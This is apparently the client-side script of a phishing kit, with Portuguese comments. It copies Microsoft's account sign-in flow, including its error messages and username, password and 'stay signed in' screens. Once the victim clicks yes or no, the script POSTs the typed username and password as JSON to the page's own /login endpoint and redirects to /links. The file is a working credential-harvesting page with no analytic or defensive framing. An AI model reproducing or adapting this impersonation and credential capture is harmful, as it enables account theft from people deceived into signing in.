document.addEventListener('DOMContentLoaded', () => {

    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "Please enter the password for your Microsoft account.";

    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');

    let view = "uname";
    let unameVal = false;
    let pwdVal = false;

    // -------------------------------
    // FUNÇÃO GLOBAL PARA ENVIAR AO BACKEND
    // -------------------------------
    async function enviar(choice) {

        const body = {
            username: unameInp.value,
            password: pwdInp.value,
            dontShowAgain: document.querySelector("input[name='dont_show_again']")?.checked || false,
            choice // yes ou no
        };

        console.log("Enviando body:", body);

        try {
            const res = await fetch("/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });

            const data = await res.json();
            console.log("Resposta do servidor:", data);

            // 🔥 REDIRECT APÓS O ENVIO
            window.location.href = "/links";

        } catch (err) {
            console.error("Erro ao enviar:", err);
        }
    }

    // BOTÃO NEXT ----------------------------------
    const nxt = document.getElementById('btn_next');
    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.add('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');

            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });

    // BOTÃO SIGN IN -------------------------------
    const sig = document.getElementById('btn_sig');
    sig.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            document.getElementById("section_pwd").classList.add('d-none');
            document.getElementById('section_final').classList.remove('d-none');
            view = "final";

            // atualiza email da última tela
            document.getElementById("user_identity_final").innerText = unameInp.value;
        }
    });

    // VALIDAÇÕES -----------------------------------
    function validate() {

        function unameValAction(ok) {
            if (!ok) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(ok) {
            if (!ok) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            unameInp.value.trim() === "" ? unameValAction(false) : unameValAction(true);

        } else if (view === "pwd") {
            pwdInp.value.trim() === "" ? pwdValAction(false) : pwdValAction(true);
        }
    }

    // BOTÃO BACK -----------------------------------
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.add('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    // BOTÃO YES → envia choice = "yes"
    document.getElementById("btn_yes").addEventListener("click", (e) => {
        e.preventDefault();
        enviar("yes");
    });

    // BOTÃO NO → envia choice = "no"
    document.getElementById("btn_no").addEventListener("click", (e) => {
        e.preventDefault();
        enviar("no");
    });

});
